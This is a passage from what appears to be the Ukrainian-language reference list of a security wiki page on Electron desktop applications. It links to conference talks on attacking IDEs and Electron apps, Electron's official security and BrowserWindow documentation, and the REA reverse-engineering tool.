- [19] [APPSEC Cali 2018 - MarkDoom: як я зламав кожне велике IDE за 2 тижні](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: злам популярних настільних застосунків і виявлення нової поверхні атаки в Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Безпека Electron](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Параметри webPreferences для Electron BrowserWindow](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: зворотна інженерія будь-чого](https://github.com/morluto/rea)
- [24] [Відновлення артефактів JavaScript у REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Робочі процеси JavaScript-застосунків між шарами в REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
